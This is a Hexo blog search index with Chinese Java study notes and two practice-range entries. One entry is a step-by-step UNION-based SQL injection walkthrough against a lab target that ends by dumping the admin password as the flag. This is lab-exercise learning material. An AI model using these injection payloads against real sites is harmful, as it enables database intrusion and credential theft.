<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>靶场练习2</title>
      <link href="/newblog/2020/11/09/ba-chang-lian-xi-2/"/>
      <url>/newblog/2020/11/09/ba-chang-lian-xi-2/</url>
      
        <content type="html"><![CDATA[<p>尤里在得到女神家网站密码后，却发现注入点权限很小，凭他的皮毛技术也没找到网站后台，<br>这是尤里通过旁站查询，他发现了女神家网站是用的主机空间托管，<br>他立刻扫描旁站，果然发现一个站点，且后台是默认路径……<br>尤里冷笑一声行动了起来，这时有一层防火墙拦在了他的面前。。</p><p>传送门：<a target="_blank" rel="noopener" href="http://59.63.200.79:8004/">http://59.63.200.79:8004/</a>  </p>]]></content>
      
      
      <categories>
          
          <category> hac </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java基础笔记核心卷一</title>
      <link href="/newblog/2020/10/07/java-xue-xi-bi-ji-1/"/>
      <url>/newblog/2020/10/07/java-xue-xi-bi-ji-1/</url>
      
        <content type="html"><![CDATA[<p>百度了applet含义 java语言编写的小程序，HTML全称 Hyper Text Markup(标记)  Language ，超文本标记语言，oriented 面向 ，OOP（Object-Oriented Programming）面向对象编程，GUI(Graphical User Interface)图形用户接口</p><p>2020年10月12日23:14:26</p><p>百度了尾数。\u转义可以不在‘ ’和“ ”之中， unicode编码和中文互转System.out.println(“\u6211\u7231\u4f60”); 除数，被除数，8被32除 .？8（被除数）/32（除数）</p><p>2020年10月13日21:01:57</p><p> 位运算符看不懂 操作数只能是整型和字符型</p><p>&amp; 位于运算 0&amp;0=0，1&amp;0=0,1&amp;1=1,0&amp;1=0</p><p>| 位或运算 0|0=0,0|1=1,1|1=1.1|0=1</p><p>^异或运算 1^0=1,1^1=0,0^0=0,0^1=1</p><p>百度补码，计算机中的有符号数有三种表示方法，原码，反码，补码。在计算机系统中，数值均采用补码表示和存储，因为可以将符号位和数值域统一处理。</p><p>原码：符号位+真值绝对值</p><p>反码：正数反码是本身，负数反码：符号位不变，其余位取反</p><p>补码：正数补码是本身，负数补码：反码+1</p><p>机器数：一个数在计算机中的二进制表现形式。带符号位</p><p>真值：十进制正数</p><p>2020年10月17日22:44:26</p><p>代码点：unicode为字符分配的编号，一个代码只占一个代码点却不一定只占一个代码单元</p><p>代码单元:编码方法中对一个字符编码后所占最小的存储单元，utf-8中代码单元就是一个字节，因为一个字符可以被编码成一个字节，两个字节或3,4个字节。utf-16中代码单元就是两个字节（一个char）</p><p>2020年10月19日20:00:25</p><p>java.lang 包是java语言的核心，他提供了java中的基础类。</p><p>bounds(界限范围)   cast(模 n.)</p><p>断言:布尔表达，关键字 assert,两种形式 assert Exception1 ,assert Exception1;Exception2 ,其中Exception1总是1个布尔表达式，Exception2是断言失败输出的字符串，如果E1为假，则抛出一个AssertError这是一个错误，而不是异常，也就是一个unchecked Exception (不可控制异常)，所以不推荐捕获，因为会导致你的系统进入不稳定状态。编译时启用断言使用source1.4标记，即java source1.4 Test.java,运行时启用断言使用-ea参数。要在系统类中启用断言可以使用-esa和-eda参数</p><p>java object类（?）</p><p>CharSequence形参（接口） 完全类似String类型的实参</p><p>this.x=x  解读：成员变量：类内，方法外。局部变量：方法内，包含参数。this.成员相关</p><p>System.exit(0);正常退出程序，结束jvm。System.exit(非0)非正常退出，一般用在catch块中，捕获异常结束程序时。</p><p>2020年10月20日22:21:51</p><p>shell(?) DOS（？）命令提示符（）ini文件（？）</p><p>绝对路径：硬盘上的真正路径，相对路径：/表示根目录 ，./ 表示当前目录 ， ../ 表示上级目录 </p><p>轻量级：组件对环境的依赖程度 越小越轻</p><p>奇怪的知识：拉丁字母（罗马字母）10.20 toby里面没看</p><p>2020年10月21日20:00:40</p><p>System.out.printf()打印标志</p><p>2020年10月22日19:26:03</p><p>java标注 是对编译器或者处理java源文件或者类文件的工具提供信息的一种机制@SuperessWarnings(“fallthrough”),如果想警告使用直通式行为，加这个标注就不会对这个方法生成警告</p><p>枚举类型（？）</p><p>显示转换：表示范围大的类型转化为表示范围小的类型</p><p>隐式转换:范围小的类型转换为范围大的类型，也叫自动转换</p><p>compatible 兼容的</p><p>continue 和break</p><p>2020年10月23日19:05:33</p><p>2020年10月26日18:18:46</p><p>decimal 小数 , binomial 二项 , coefficient 系数， 如果需要在运行过程中扩展数组大小 使用ArrayList 数据结构,数组长度为0和null不同 ，大多数为0和Null好像都不同</p><p>2020年10月27日17:54:08</p><p>printf(“%8.2f”,a);用8个字符宽度和小数点后2位两个字符的精度打印a。System.out.printf(“%.0f%%”,a);  输出%必要前面要带格式</p><p>2020年10月28日17:54:36</p><p>allocate 分配  ，triangulat 三角，lottery 彩票， odds 几率,construct构造 ，instance 实例</p><p>类 构造 对象 的过程称为 创建类的实例。</p><p>2020年10月29日20:01:22</p><p>商品被添加到订单中 ： 找名词和动词 ，确定order （订单）类中有add方法，其中item对象（商品）是一个参数。</p><p>unified 统一，</p><p>Date birthday = new Date();    对象指的是 new Date(), 其中 Date是构造器名字，并且它的值是新创建对象的引用，且这个引用存储在对象变量birthday中，birthday 是对象变量，但是它不是对象，而且对象变量并没有实际包含一个对象，仅仅是引用，对象的引用指的是 birthday,</p><p>2020年10月30日20:04:47</p><p>mutator method 更改器方法，access method 访问器方法，在java中这两种在语法上没有明显区别</p><p>LocalDate类 中的minusDays(int n)方法的参数是LocalDate 减去的天数，意思是当前日期的前n天，如果minusDays(today - 1),就是today - today +1,意为 1号，</p><p>plusDays(int n)当前日期的后n天</p><p>再次记记 %2d, 前面补齐空格 占够两个字符。</p><p>2020年11月1日18:39:24</p><p>2020年11月2日20:03:10</p><p>源文件名必须与public类的名字相匹配。在源文件中只能有一个公有类（public修饰）,可以有任意数目的非公有类。</p><p>Unix的make工具，windows的nmake工具，可以认为java编译器内置了make功能（？）</p><p>所有java对象都是在堆中构造的，且构造器总是伴随的new操作符一起调用的</p><p>redundant 冗余的</p><p>在所有的地方不要命名与实例域同名的变量,因为这些变量屏蔽了同名的实例域：public Employee</p><p>{</p><p>private String name;</p><p>private double salary;</p><p>private LocalDate hireday;</p><p>public Employee(String n,double s,int year,int month,int day)</p><p>​    {</p><p>​        String name = n;// error</p><p>​        double salary = s;//error</p><p>​     } </p><p>public void raiseSalary(double byPersent)</p><p>​            {</p><p>​                double raise = salary*byPersent/100;</p><p>​                salary+=raise;</p><p>​            }</p><p>}</p><p>implicit 隐式的，explicit显示的，隐式参数（方法调用的目标或接收者）是方法名前的类对象，没有·出现在方法的声明中。显示参数是方法名后面括号内的数值，出现在方法的声明中。</p><p>前面讲的this关键字，就是表示隐式参数，如果需要的话可以用如下方法写raiseSalary方法</p><p>double raise = this.salary*byPersent/100;</p><p>this.salary+=raise;</p><p>因为这样可以将实例域与局部变量区分开来。</p><p>在java，所有的方法都必须在类的内部定义，但并不表示它们都是内联方法。是否将某个方法设置为内联方法是java虚拟机的任务，及时编译器会监视调用那些简洁、经常使用、没有被重载以及可优化的方法。</p><p>seniority 级别高，年长，</p><p>不要编写返回引用 可变对象 的访问器方法。见Test2.java</p><p>产生疑问？方法调用对象还是对象调用方法。按理说应该是对象调用方法。但是 有句话很难理解 </p><p>方法可以访问所调用对象的私有数据。这句话表面上就是方法调用对象。好 这个问题不是这句话的关键点，先不考虑这个问题，关键是 test类中的方法可以访问test类任何一个对象的私有域。</p><p>2020年11月3日19:59:49</p><p>primitive 基本的原始的，immutable 不可变的。final 修饰符 修饰基本类和不可变类的域。见4.3.9加了final不能Set，初始化之后不能修改。  </p><p>不可变类 ：类中的每个方法不会改变其对象，例如String类。</p><p>private int id ;private static int nextId; 1000类对象有1000个id，但只有一个nextId，换言之nextId属于类不属于对象。而且每个类只能有一个这样的域。在绝大多数的面向对象编程语言中，静态域也叫类域</p><p> public void setId(){id = nextId; nextId++;}  假定harry.setId();   上述代码类似harry.id=Employee.nextId; Employee.nextId++;</p><p>静态常量 ：public class Math{public static final double PI =3.14159265358979323846;} Math.PI获得这个常量。</p><p>public class System{public static final PrintStream out;…}   System.out使用 </p><p>前面提到过每个类对象会对公有域进行修改，但是公有常量，final 域没问题，因为一旦初始化赋值之后不能修改。</p><p>System类中有一个setOut方法，它可以将System.out设置为不同的流， 问题来了，他为什么可以改变final变量的值 ，因为它是一个本地方法，java本地方法会绕过JAVA语言的存取控制机制。在自己编写程序时不应该这样处理。</p><p>静态方法：不能面向对象的实施操作方法，不使用对象，话句话说没有隐式参数，也就是没有this参数。静态方法不能访问实例域，但是可以访问本类的静态域。类名调用这个静态方法。</p><p>下面这两种方法使用静态方法：1、不需要放访问对象状态，其所需参数都是显示参数。2、只需要访问类的静态域</p><p>静态方法还有另一种用途，静态工厂方法 factory method 来构造对象，如类 LcoalDate和NumberFormat ，见4.4.4</p><p>current 当前的，</p><p>2020年11月4日20:24:15</p><p>每一个类可以有一个main方法，Idea 里面我写的代码都是单元测试.见idea</p><p>如果独立测试test类，只需执行 java test 。如果test类是一个更大型应用程序的一部分，就可以使用 java Application ，test类的main方法就不会执行 ,见idea 中的StaticTest.java</p><p>见4.5上面一点点   java Employee  和 java StaticTest 的区别 （？？）见idea StaticTest.java #在上面</p><p> 方法参数：回忆一下有关将参数传递给函数或方法的专业术语。按值调用（call by value ）:即方法接收的是调用者提供的值；按引用调用（call by reference）方法接收的是调用者提供的变量的地址。</p><p>方法可以修改传递引用所对应的变量值，但是不能修改传递值调用所对应的变量值。</p><p>java程序设计语言总是采用按值调用的，方法得到的是所有参数值得一个拷贝，特别是，方法不能修改传递给它的任何参数变量的内容。ex:double a =10; harry.raiseSalary(a);  不必理睬方法的具体实现，方法调用后，a 还是10。</p><p>2020年11月5日20:20:00</p><p>方法参数共有两种类型：基本数据类型（数字，布尔值）和 对象引用。上述已经知道 一个方法不能修改一个基本数据类型的参数，但对象引用作为参数就不同了。</p><p>idea中 T4.java证明了java不是按引用调用的。实际上 对象引用是按值调用的。</p><p>总结一下java中方法参数的使用情况：1、方法不能修改基本数据类型的参数。2、方法可以改变对象参数的状态。3、方法中不能让对象参数 引用一个新对象。 见 T4.java.</p><p>modify 修改，triple 三倍的</p><p>从现在在 idea中注意 注释的书写。见ParamTest.java</p><p>2020年11月6日20:18:48</p><p>多个方法，名称相同，参数不同 是为重载（overloading）。</p><p>要完整的描述一个方法，需要指出 方法名 和 参数类型。这叫做方法的签名（signature）。ex :String类有四个indexOf()的公有方法，它们的签名分别是 indexOf(int)  indexOf(int,int)  indexOf(String)  indexOf(String,int) 。返回类型不是方法签名的一部分 ，也就是说不能有两个 方法名和 参数类型相同，但返回类型不同的方法。</p><p>如果在构造器中没有显示的给域赋值，那么就会自动的被赋为默认值（数值为0，布尔为false,对象引用为null），只有缺乏程序设计经验的人才会这么做，因为会影响程序代码可读性。 这是域 和局部变量最主要的不同点 ，必须明确的初始化方法中的 局部变量。但是没有初始化类中的域，就会被赋为默认值（0，false或null）。</p><p>仅当类没有提供任何构造器时，系统才会提供一个默认构造器（无参数）。见 idea T5.java</p><p>显示域初始化 T6.java</p><p>2020年11月7日20:04:00</p><p>参数命名：public Employee(String n ,double s){name = n;salary = s;}  这样命名缺陷是只有阅读代码才能了解参数 n和s的含义 。有些程序员喜欢在 name前加字符a, ex:aName,aSalary 。还有一种技巧  参数变量用相同的名字把实例域屏蔽，public Employee (String name ,double salary){this.name = name;this.salary =salary;} ,参数命名为name和salary 将引用这个参数，而不是实例域，但是采用this可以访问实例域，this 隐式参数，也就是所构造的对象。</p><p>关键字this引用方法的隐式参数的 另外一个含义：如果构造器第一个语句形如this (…)，这个构造器将调用同一的类的另外一个构造器。</p><p>ex:public Employee (double s)</p><p>{  this(“Employee #”+ nextId,s  );</p><p> nextId++;   }</p><p>initialize 初始化 ，initialization 初始化，</p><p>前面已经讲了两种初始化数据域的方法：在构造器中设置值，在声明中赋值。第三种 称为初始化块（initialization block）,在一个类的声明中 可以包含多个代码块，只要构造类的对象，这些代码块就会被执行。首先运行初始化代码块，再运行构造器主体部分，这种机制不是必需的，也不是常见的，通常将初始化代块放在构造器中。建议将初始化块放在域定义之后，避免循环定义。</p><p>下面是调用构造器的具体处理步骤：</p><p>1）所有数据域被初始化为默认值（0，false，null）</p><p>2）根据类声明数据域的顺序，依次执行所有域初始化语句和初始化块。</p><p>3）如果构造器第一行调用了第二个构造器，执行第二个构造器主体。</p><p>4）执行这个构造器主体。</p><p>所有的静态初始化语句和静态初始化块都依照类定义的顺序。在类的第一次加载时，将会对静态域进行初始化。</p><p>在jdk 6之前，可以用java编写没有main方法的“Hello,World”程序，</p><p>public class Hello</p><p>{</p><p>​    static</p><p>​    {</p><p>Syetem.out.println(“Hello,World”) ;</p><p>​     }</p><p>}</p><p>当用java Hello 调用这个类时，就会加载这个类，静态初始化块就会打印“Hello，World”。在此之后，显示一个消息指出main未定义。在Java SE 7之后，java程序首先检查是否有一个main方法。 </p><p>2020年11月9日20:16:11</p><p>2020年11月10日20:24:15</p><p>java有自动的垃圾回收器，不需要人工的回收内存，所以java不支持析构器，当对象使用了内存之外的资源，例如，文件或资源使用了系统资源的另一个对象的句柄。在这种情况下，当资源不在被需要时，将其回收和再利用显得十分重要。</p><p>可以为任何一个类添加finalize方法，该方法在回收器清除对象之前调用，在实际应用中，不要依赖于fianlize方法回收任何短缺的资源，这位是因为很难知道这个方法什么时候调用。</p><p>有个名为System.runFinalizersOnExit(true)的方法能够确保fianalizer方法在java关闭前被调用，不够该方法不安全，也不鼓励使用，有一种代替方法Runtime.addShutdownHook  添加关闭钩 ，详细内容参看API.</p><p>如果某个资源在使用完毕后立刻被关闭，那么就需要人工来，对象用完之后，可以用一个close方法来完成相应的清理操作。</p><p>Java允许使用包（package）将类组织起来，借助于包可以方便的组织自己的代码，并将自己的代码和别人提供的代码库分开管理。</p><p>标准的Java类库分布在多个包中，包括java.lang,java.util和java.net。</p><p>标准的Java包具有一个层次结构，如同硬盘的目录嵌套一样，也可以使用嵌套层次组织包。</p><p>所有标准的Java包都处于java和javax包层次中。</p><p>使用包的原因是确保类名的唯一性。假如两个程序员不约而同的建立了Employee类，只要将这些类</p><p>置于不同的包中，就不会产生冲突。事实上，为了包名的唯一绝对性，Sun公司建议将公司的因特网域名（这显然是独一无二的），以逆序的形式作为包名，并且对于不同的项目使用不同的子包。例如,horstmann.com是本书作者之一注册的域名。逆序形式com.horstmann。这个包还可以进一步划分子包，如com.horstmann.corejava。</p><p>从编译器角度看，嵌套的包之间没有任何关系。例如java.util包与java.util.jar包毫无关系。每一个都拥有独立的类集合。</p><p>类的导入：一个类可以使用所属包中的所有类，以及其他包中的公有类（public class）.下面两种方法介绍使用其他包中的公有类：第一种方式是在每个类名前加上所属包名。例如，java.time.LocalDate today = java.time.LocalDate.now();这显然很繁琐。第二种方式：是使用import语句，它是引用包含在包中的类的简明描述，一旦使用了import语句，在使用类时，就不必加包名，可以使用import语句导入一个特定的类或者整个包，import语句位于源文件顶部，但位于package语句后面，例如可以使用下面这个语句带入java.util包中所有的类 import java,util.*;</p><p>包作用域：标记为public部分可以被任意类使用，标记为private的部分只能被定义它们的类使用，如果没有指定public或private，那么这个部分（类，变量，方法）可以被同一个包中所有方法使用。</p><p>对于变量来说没有设置为private的话是不合适的，破坏了封装性。这真的会成为一个问题吗？答案是视情况而定。默认情况下，包不是一个密封的实体，任何人可以任意的向包中添加类，当然有敌意的或低水平的程序员可能利用包的可见性添加一些修改变量功能的代码，例如在早期的Java程序设计语言版本中，只要将 package java.awt 放入类文件的开头，就可以很容易的将其他类混入java.awt 包中，然后把结果文件放置在类路径某处的java/awt子目录下，就可以访问java.awt包的内部了，使用这一手段，可以对警告框进行设置。然而可以通过包密封（package sealing）机制来解决将各种包混杂一起的问题，如果将一个包密封起来，就不能向这个包添类了。在第九章介绍 制作包含密封包的JAR文件。</p><p>2020年11月13日20:52:17</p><p>2020年11月16日20:13:20</p><p>2020年11月18日20:04:41</p><p>为了使类能被多个程序共享，需要做到下面几点：</p><p>1、把类放到同一个目录中，例如/home/user/classdir。需要注意，这个目录是包树状结构的基目录。如果希望将com.horstmann.corejava.Employee类添加到其中，这个Employee.class类文件就必须位于子目录/home/user/classdir/com/horstmann/corejava中。</p><p>2、将jJAR文件放在一个目录中。例如/home/user/archives。</p><p>3、设置类路径（class path）。类路径是所有包含类文件的路径的集合。</p><p>在UNIX环境中，类路径的不同项目之间用：分割  ：</p><p>/home/user/classdir:.:/home/user/archives/archive.jar</p><p>而在windows环境中，则以分号；分割 ：</p><p>c:\classdir;.;c:\archives\archives.jar</p><p>在上述；两种情况中，句点（.）表示当前目录。</p><p>类路径包括：</p><p>●基目录/home/user/classdir或c:\classes；</p><p>●当前目录（.）；</p><p>●JAR文件/home/user/archives/archives.jar或c:\archives\archives.jar。</p><p>从Java SE 6开始，可以在JAR文件目录中指定通配符，如下：/home/user/classdir:.:/home/user/archives/‘*’</p><p>或者c:\classdir;.;c:\archives\*</p><p>但在UNIX中，禁止使用*以防止shell命令进一步扩展。</p><p>由于运行时库文件（rt.jar和在jre/lib与jre/lib/ext目录下的一些其他的JAR文件）会被自动地搜索，所以不必将它们显示的列在类路径中。</p><p>javac编译器总是在当前的目录中查找文件，java虚拟器仅在类路径中有”.”目录时才查看当前目录，如果没有设置类路径也不会产生问题，因为默认的类路径包含”.”目录,然而如果设置了类路径却忘了包含”.”目录，则程序仍然可以编译但无法运行。</p>]]></content>
      
      
      <categories>
          
          <category> java笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场练习</title>
      <link href="/newblog/2020/10/07/ba-chang-lian-xi-1/"/>
      <url>/newblog/2020/10/07/ba-chang-lian-xi-1/</url>
      
        <content type="html"><![CDATA[<p>2020年11月8日21:14​ ​ ​ :underage:18</p><p>尤里正在追女神小芳，在得知小芳开了一家公司后，尤里通过whois查询发现了小芳公司网站<br>学过一点黑客技术的他，想在女神面前炫炫技。于是他打开了<a target="_blank" rel="noopener" href="http://59.63.200.79:8003/">http://59.63.200.79:8003/</a> 。</p><p><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/index.php?id=1">http://59.63.200.79:8003/index.php?id=1</a> ，</p><p>第一步：判断是否存在sql注入漏洞</p><p>构造 ?id=1 and 1=1  ,回车 ，页面返回正常。</p><p>再构造  ?id=1 and 1=2 ，回车，页面返回错误。初步判断 这里可能存在一个注入漏洞。</p><p>第二步：判断字段数</p><p>构造 ?id=1 and 1=1 order by 1  ,回车，页面正常。</p><p>再构造 ?id=1 and 1=1 order by 2 ，回车 ，页面正常。</p><p>再构造 ?id=1 and 1=1 order by 3 ,回车 ，页面返回 错误 ，判断 字段数为 2</p><p>第三步：判断回显点</p><p>构造 ?id=1 and 1=2 union select 1,2    ,页面出现了 2 ，说明我们可以在数字 2 处显示我们想要的内容。</p><p>第四步：查询相关内容</p><p>1、查询当前数据库名 </p><p>构造 ?id=1 and 1=2 union select 1,database()  ,回车，显示数据库名称 maoshe</p><p>2、查询当前数据库版本 </p><p>构造 ?id=1 and 1=2 union select 1,version()  ，回车，显示数据版本5.5.53</p><p>3、查询数据库表名</p><p>构造 ?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1    ,回车，显示 admin  绝大多数情况下，管理员的账号密码都在admin表里。</p><p>4、查询字段名</p><p>构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 0,1  ，回车  ，显示 id ，limit 1,1 显示 uesername ,  limit 2,1 显示 password。 查出admin表 有三个字段 。    ps:注意 limit 0,1  和 1,1 和 2,1 …才是显示正确的（不知道为什么）</p><p>5、查询字段内容</p><p>构造 ?id=1 and 1=2 union select 1,username from admin limit 0,1   ，回车，显示 admin .如果limit 1,1 没有显示，说明只有一个用户。</p><p>再构造 ?id=1 and 1=2 union select 1,password from admin limit 0,1 ，回车，显示 hellohack。</p><p>最后提交Flag  :hellohack </p><p>ok</p>]]></content>
      
      
      <categories>
          
          <category> hac </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>这是写的测试博客~~</title>
      <link href="/newblog/2020/09/22/my-first-blog/"/>
      <url>/newblog/2020/09/22/my-first-blog/</url>
      
        <content type="html"><![CDATA[<h1 id="这是写的测试文档"><a href="#这是写的测试文档" class="headerlink" title="这是写的测试文档"></a>这是写的测试文档</h1><p>测试显示博客内容 <del>~</del></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/newblog/2020/09/22/hello-world/"/>
      <url>/newblog/2020/09/22/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
